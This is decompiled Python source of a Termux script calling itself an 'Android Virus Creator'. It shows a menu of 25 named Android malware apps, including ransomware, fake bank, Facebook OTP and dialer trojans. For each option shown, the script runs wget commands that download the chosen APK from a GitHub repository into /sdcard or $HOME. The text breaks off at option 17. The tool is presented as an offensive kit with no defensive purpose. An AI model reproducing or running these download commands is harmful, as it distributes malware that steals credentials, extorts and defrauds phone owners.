# At Time : Fri May 15 00:30:21 2020
# Python bytecode 2.7
import urllib, os, sys, time
red = '\x1b[1;91m'
green = '\x1b[1;92m'
yellow = '\x1b[1;93m'
blue = '\x1b[1;94m'
purple = '\x1b[1;95m'
cyan = '\x1b[1;96m'
white = '\x1b[1;97m'

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.2 / 100)


def exit():
    print ''
    print '\x1b[41mEXITING PROGRAM\x1b[00m'
    slowprint('Thanks for using this tools !')
    slowprint('Suppprt me on youtube : SAYDOG')
    slowprint('Exiting Program ...')
    os.system('xdg-open https://www.youtube.com/channel/UCDoJC1ZJ_SmYKZZLD8PBmcQ')
    os.system('exit')


logo = '\n\x1b[1;92m\n       \xe2\x95\xb2 \xe2\x96\x81\xe2\x96\x82\xe2\x96\x82\xe2\x96\x82\xe2\x96\x81 \xe2\x95\xb1\n       \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\n      \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\n     \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n  \xe2\x96\x84\xe2\x96\x88 \xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x84  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\n  \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88\n  \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \x1b[1;91mVIRUS \x1b[1;92m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88     \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88     \xe2\x96\x88\xe2\x96\x88\n  \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88\n  \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\n     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n      \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n       \xe2\x96\x88\xe2\x96\x88     \xe2\x96\x88\xe2\x96\x88         \x1b[41m\x1b[1;97mANDROID VIRUS CREATOR BY IQBALMH18\x1b[00m\x1b[1;92m\n       \xe2\x96\x88\xe2\x96\x88     \xe2\x96\x88\xe2\x96\x88\x1b[00m\n'

def app():
    os.system('clear')
    slowprint(logo)
    slowprint('VIRUS APP FOR ANDROID')
    slowprint('After you creating Virus App please check your connections')
    slowprint('Your termux must have a permissions to storage for save to /sdcard')
    print ''
    print ' VIRUS NAME                               LEVEL'
    print '--------------------                    --------'
    print '\x1b[1;33m 1.\x1b[00m Advance OBF\x1b[1;91m                             Good'
    print '\x1b[1;33m 2.\x1b[00m Agent\x1b[1;91m                                   Good'
    print '\x1b[1;33m 3.\x1b[00m Bad News\x1b[1;91m                            Exellent'
    print '\x1b[1;33m 4.\x1b[00m BiOs\x1b[1;91m                                Exellent'
    print '\x1b[1;33m 5.\x1b[00m Blat SMS\x1b[1;91m                                Good'
    print '\x1b[1;33m 6.\x1b[00m Brain Test\x1b[1;91m                              Good'
    print '\x1b[1;33m 7.\x1b[00m CRD Informations\x1b[1;91m                    Exellent'
    print '\x1b[1;33m 8.\x1b[00m Candy Corn\x1b[1;91m                              Good'
    print '\x1b[1;33m 9.\x1b[00m Cats Ransom\x1b[1;91m                         Exellent'
    print '\x1b[1;33m10.\x1b[00m Chis Cortos\x1b[1;91m                             Good'
    print '\x1b[1;33m11.\x1b[00m Chis Ticos\x1b[1;91m                              Good'
    print '\x1b[1;33m12.\x1b[00m Claco\x1b[1;91m                               Exellent'
    print '\x1b[1;33m13.\x1b[00m Dend Droid\x1b[1;91m                          Exellent'
    print '\x1b[1;33m14.\x1b[00m Drop Dialer\x1b[1;91m                         Exellent'
    print '\x1b[1;33m15.\x1b[00m Elite VIP\x1b[1;91m                           Exellent'
    print '\x1b[1;33m16.\x1b[00m Facebook OTP\x1b[1;91m                            Good'
    print '\x1b[1;33m17.\x1b[00m Fake Bank\x1b[1;91m                               Good'
    print '\x1b[1;33m18.\x1b[00m Fake CMCC\x1b[1;91m                               Good'
    print '\x1b[1;33m19.\x1b[00m Fake OP\x1b[1;91m                                 Good'
    print '\x1b[1;33m20.\x1b[00m Fake Valid\x1b[1;91m                              Good'
    print '\x1b[1;33m21.\x1b[00m Fake AV\x1b[1;91m                                 Good'
    print '\x1b[1;33m22.\x1b[00m Image Pets\x1b[1;91m                              Good'
    print '\x1b[1;33m23.\x1b[00m Laughther\x1b[1;91m                               Good'
    print '\x1b[1;33m24.\x1b[00m Ohmygodness\x1b[1;91m                         Exellent'
    print '\x1b[1;33m25.\x1b[00m SMS Worker\x1b[1;91m                              Good'
    print '\x1b[1;33m99. Back'
    print '\x1b[00m'
    pilapp = raw_input('Virus\xc2\xaeDroid > ')
    if pilapp == '':
        app()
    else:
        if pilapp == '1' in pilapp:
            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
            if a == '1' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/AdvanceOBF.apk;mv AdvanceOBF.apk /sdcard')
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    app()
                if b == '2' in b:
                    exit()
            if a == '2' in a:
                slowprint('Please wait for a few minutes ...')
                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/AdvanceOBF.apk;mv AdvanceOBF.apk /$HOME')
                print '\x1b[41mSUCCESS\x1b[00m'
                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                print ''
                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                if b == '1' in b:
                    app()
                if b == '2' in b:
                    exit()
        else:
            if pilapp == '2' in pilapp:
                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                if a == '1' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Agent.apk;mv Agent.apk /sdcard')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        app()
                    if b == '2' in b:
                        exit()
                if a == '2' in a:
                    slowprint('Please wait for a few minutes ...')
                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Agent.apk;mv Agent.apk /$HOME')
                    print '\x1b[41mSUCCESS\x1b[00m'
                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                    print ''
                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                    if b == '1' in b:
                        app()
                    if b == '2' in b:
                        exit()
            else:
                if pilapp == '3' in pilapp:
                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                    if a == '1' in a:
                        slowprint('Please wait for a few minutes ...')
                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BAD_NEWS.apk;mv BAD_NEWS.apk /sdcard')
                        print '\x1b[41mSUCCESS\x1b[00m'
                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                        print ''
                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                        if b == '1' in b:
                            app()
                        if b == '2' in b:
                            exit()
                    if a == '2' in a:
                        slowprint('Please wait for a few minutes ...')
                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BAD_NEWS.apk;mv BAD_NEWS.apk /$HOME')
                        print '\x1b[41mSUCCESS\x1b[00m'
                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                        print ''
                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                        if b == '1' in b:
                            app()
                        if b == '2' in b:
                            exit()
                else:
                    if pilapp == '4' in pilapp:
                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                        if a == '1' in a:
                            slowprint('Please wait for a few minutes ...')
                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BiOs.apk;mv BiOs.apk /sdcard')
                            print '\x1b[41mSUCCESS\x1b[00m'
                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                            print ''
                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                            if b == '1' in b:
                                app()
                            if b == '2' in b:
                                exit()
                        if a == '2' in a:
                            slowprint('Please wait for a few minutes ...')
                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BiOs.apk;mv BiOs.apk /$HOME')
                            print '\x1b[41mSUCCESS\x1b[00m'
                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                            print ''
                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                            if b == '1' in b:
                                app()
                            if b == '2' in b:
                                exit()
                    else:
                        if pilapp == '5' in pilapp:
                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                            if a == '1' in a:
                                slowprint('Please wait for a few minutes ...')
                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BlatSMS.apk;mv BlatSMS.apk /sdcard')
                                print '\x1b[41mSUCCESS\x1b[00m'
                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                print ''
                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                if b == '1' in b:
                                    app()
                                if b == '2' in b:
                                    exit()
                            if a == '2' in a:
                                slowprint('Please wait for a few minutes ...')
                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BlatSMS.apk;mv BlatSMS.apk /$HOME')
                                print '\x1b[41mSUCCESS\x1b[00m'
                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                print ''
                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                if b == '1' in b:
                                    app()
                                if b == '2' in b:
                                    exit()
                        else:
                            if pilapp == '6' in pilapp:
                                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                if a == '1' in a:
                                    slowprint('Please wait for a few minutes ...')
                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BrainTest.apk;mv BrainTest.apk /sdcard')
                                    print '\x1b[41mSUCCESS\x1b[00m'
                                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                    print ''
                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                    if b == '1' in b:
                                        app()
                                    if b == '2' in b:
                                        exit()
                                if a == '2' in a:
                                    slowprint('Please wait for a few minutes ...')
                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/BrainTest.apk;mv BrainTest.apk /$HOME')
                                    print '\x1b[41mSUCCESS\x1b[00m'
                                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                    print ''
                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                    if b == '1' in b:
                                        app()
                                    if b == '2' in b:
                                        exit()
                            else:
                                if pilapp == '7' in pilapp:
                                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                    if a == '1' in a:
                                        slowprint('Please wait for a few minutes ...')
                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/CRD-Information.apk;mv CRD-Information.apk /sdcard')
                                        print '\x1b[41mSUCCESS\x1b[00m'
                                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                        print ''
                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                        if b == '1' in b:
                                            app()
                                        if b == '2' in b:
                                            exit()
                                    if a == '2' in a:
                                        slowprint('Please wait for a few minutes ...')
                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/CRD-Information.apk;mv CRD-Information.apk /$HOME')
                                        print '\x1b[41mSUCCESS\x1b[00m'
                                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                        print ''
                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                        if b == '1' in b:
                                            app()
                                        if b == '2' in b:
                                            exit()
                                else:
                                    if pilapp == '8' in pilapp:
                                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                        if a == '1' in a:
                                            slowprint('Please wait for a few minutes ...')
                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/CandyCORN.apk;mv CandyCORN.apk /sdcard')
                                            print '\x1b[41mSUCCESS\x1b[00m'
                                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                            print ''
                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                            if b == '1' in b:
                                                app()
                                            if b == '2' in b:
                                                exit()
                                        if a == '2' in a:
                                            slowprint('Please wait for a few minutes ...')
                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/CandyCORN.apk;mv CandyCORN.apk /$HOME')
                                            print '\x1b[41mSUCCESS\x1b[00m'
                                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                            print ''
                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                            if b == '1' in b:
                                                app()
                                            if b == '2' in b:
                                                exit()
                                    else:
                                        if pilapp == '9' in pilapp:
                                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                            if a == '1' in a:
                                                slowprint('Please wait for a few minutes ...')
                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Cats.apk;mv Cats.apk /sdcard')
                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                print ''
                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                if b == '1' in b:
                                                    app()
                                                if b == '2' in b:
                                                    exit()
                                            if a == '2' in a:
                                                slowprint('Please wait for a few minutes ...')
                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Cats.apk;mv Cats.apk /$HOME')
                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                print ''
                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                if b == '1' in b:
                                                    app()
                                                if b == '2' in b:
                                                    exit()
                                        else:
                                            if pilapp == '10' in pilapp:
                                                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                if a == '1' in a:
                                                    slowprint('Please wait for a few minutes ...')
                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/ChisCORTOS.apk;mv ChisCORTOS.apk /sdcard')
                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                    print ''
                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                    if b == '1' in b:
                                                        app()
                                                    if b == '2' in b:
                                                        exit()
                                                if a == '2' in a:
                                                    slowprint('Please wait for a few minutes ...')
                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/ChisCORTOS.apk;mv ChisCORTOS.apk /$HOME')
                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                    print ''
                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                    if b == '1' in b:
                                                        app()
                                                    if b == '2' in b:
                                                        exit()
                                            else:
                                                if pilapp == '11' in pilapp:
                                                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                    if a == '1' in a:
                                                        slowprint('Please wait for a few minutes ...')
                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/ChisTICOS.apk;mv ChisTICOS.apk /sdcard')
                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                        print ''
                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                        if b == '1' in b:
                                                            app()
                                                        if b == '2' in b:
                                                            exit()
                                                    if a == '2' in a:
                                                        slowprint('Please wait for a few minutes ...')
                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/ChisTICOS.apk;mv ChisTICOS.apk /$HOME')
                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                        print ''
                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                        if b == '1' in b:
                                                            app()
                                                        if b == '2' in b:
                                                            exit()
                                                else:
                                                    if pilapp == '12' in pilapp:
                                                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                        if a == '1' in a:
                                                            slowprint('Please wait for a few minutes ...')
                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Claco.apk;mv Claco.apk /sdcard')
                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                            print ''
                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                            if b == '1' in b:
                                                                app()
                                                            if b == '2' in b:
                                                                exit()
                                                        if a == '2' in a:
                                                            slowprint('Please wait for a few minutes ...')
                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Claco.apk;mv Claco.apk /$HOME')
                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                            print ''
                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                            if b == '1' in b:
                                                                app()
                                                            if b == '2' in b:
                                                                exit()
                                                    else:
                                                        if pilapp == '13' in pilapp:
                                                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                            if a == '1' in a:
                                                                slowprint('Please wait for a few minutes ...')
                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Dend-Droid.apk;mv Dend-Droid.apk /sdcard')
                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                print ''
                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                if b == '1' in b:
                                                                    app()
                                                                if b == '2' in b:
                                                                    exit()
                                                            if a == '2' in a:
                                                                slowprint('Please wait for a few minutes ...')
                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Dend-Droid.apk;mv Dend-Droid.apk /$HOME')
                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                print ''
                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                if b == '1' in b:
                                                                    app()
                                                                if b == '2' in b:
                                                                    exit()
                                                        else:
                                                            if pilapp == '14' in pilapp:
                                                                a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                if a == '1' in a:
                                                                    slowprint('Please wait for a few minutes ...')
                                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Drop-Dialer.apk;mv Drop-Dialer.apk /sdcard')
                                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                                    slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                    print ''
                                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                    if b == '1' in b:
                                                                        app()
                                                                    if b == '2' in b:
                                                                        exit()
                                                                if a == '2' in a:
                                                                    slowprint('Please wait for a few minutes ...')
                                                                    os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Drop-Dialer.apk;mv Drop-Dialer.apk /$HOME')
                                                                    print '\x1b[41mSUCCESS\x1b[00m'
                                                                    slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                    print ''
                                                                    b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                    if b == '1' in b:
                                                                        app()
                                                                    if b == '2' in b:
                                                                        exit()
                                                            else:
                                                                if pilapp == '15' in pilapp:
                                                                    a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                    if a == '1' in a:
                                                                        slowprint('Please wait for a few minutes ...')
                                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Elite-VIP.apk;mv Elite-VIP.apk /sdcard')
                                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                                        slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                        print ''
                                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                        if b == '1' in b:
                                                                            app()
                                                                        if b == '2' in b:
                                                                            exit()
                                                                    if a == '2' in a:
                                                                        slowprint('Please wait for a few minutes ...')
                                                                        os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Elite-VIP.apk;mv Elite-VIP.apk /$HOME')
                                                                        print '\x1b[41mSUCCESS\x1b[00m'
                                                                        slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                        print ''
                                                                        b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                        if b == '1' in b:
                                                                            app()
                                                                        if b == '2' in b:
                                                                            exit()
                                                                else:
                                                                    if pilapp == '16' in pilapp:
                                                                        a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                        if a == '1' in a:
                                                                            slowprint('Please wait for a few minutes ...')
                                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Facebook-OTP.apk;mv Facebook-OTP.apk /sdcard')
                                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                                            slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                            print ''
                                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                            if b == '1' in b:
                                                                                app()
                                                                            if b == '2' in b:
                                                                                exit()
                                                                        if a == '2' in a:
                                                                            slowprint('Please wait for a few minutes ...')
                                                                            os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Facebook-OTP.apk;mv Facebook-OTP.apk /$HOME')
                                                                            print '\x1b[41mSUCCESS\x1b[00m'
                                                                            slowprint('File Saved as \x1b[1;33m/$HOME\x1b[00m')
                                                                            print ''
                                                                            b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                            if b == '1' in b:
                                                                                app()
                                                                            if b == '2' in b:
                                                                                exit()
                                                                    else:
                                                                        if pilapp == '17' in pilapp:
                                                                            a = raw_input('\x1b[41mSave file to :\x1b[00m [1] sdcard [2] $HOME (1/2) > ')
                                                                            if a == '1' in a:
                                                                                slowprint('Please wait for a few minutes ...')
                                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-BANK.apk;mv Fake-BANK.apk /sdcard')
                                                                                print '\x1b[41mSUCCESS\x1b[00m'
                                                                                slowprint('File Saved as \x1b[1;33m/sdcard\x1b[00m')
                                                                                print ''
                                                                                b = raw_input('\x1b[41mVIRUS-DROID :\x1b[00m [1] Back  [2] Exit > ')
                                                                                if b == '1' in b:
                                                                                    app()
                                                                                if b == '2' in b:
                                                                                    exit()
                                                                            if a == '2' in a:
                                                                                slowprint('Please wait for a few minutes ...')
                                                                                os.system('wget -S https://raw.githubusercontent.com/saydog/vdapp/master/Fake-BANK.apk;mv Fake-BANK.apk /$HOME')
